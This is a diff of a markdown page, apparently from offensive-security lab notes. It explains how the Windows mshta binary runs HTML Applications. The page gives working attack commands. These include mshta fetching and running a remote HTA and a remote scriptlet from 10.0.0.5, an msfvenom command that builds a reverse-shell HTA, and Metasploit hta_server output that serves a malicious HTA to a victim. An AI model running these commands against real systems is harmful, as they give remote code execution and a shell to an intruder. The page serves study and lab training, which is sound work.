@@ -1,16 +1,15 @@
 # MSHTA
 
-
 ## Theroy
+
 ### An HTML Application (HTA)
 
-HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 
+HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.
 
 ## Practice
 
 {% tabs %}
 {% tab title="Basic HTA" %}
-
 In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.
 
 ```bash
@@ -24,7 +23,9 @@ In the following example, we will use an ActiveXObject in our payload as proof o
 </body>
 </html>
 ```
+
 We can now execute the script on the target machine
+
 ```bash
 mshta.exe http://10.0.0.5/m.hta
 ```
@@ -54,27 +55,28 @@ Writing a scriptlet file that will launch cmd.exe when invoked:
 ```
 
 We can now execute the script on the target machine
+
 ```bash
 # from powershell
-/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
+cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
 ```
 {% endtab %}
 
 {% tab title="msfvenom" %}
-
 We can use the msfvenom framework to generate hta files.
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f hta-psh -o m.hta
 ```
+
 We can now execute the script on the target machine
+
 ```bash
 mshta.exe http://10.0.0.5/m.hta
 ```
 {% endtab %}
 
 {% tab title="metasploit" %}
-
 We can use the metasploit framework to generate hta files and directly serv it throught our webserver.
 
 ```bash
@@ -95,12 +97,13 @@ msf6 exploit(windows/misc/hta_server) >
 [*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
 [*] Server started.
 ```
-On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
 
+On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
 {% endtab %}
 {% endtabs %}
 
 ## Resources
 
 {% embed url="https://tryhackme.com/room/weaponization" %}
+
 {% embed url="https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution" %}
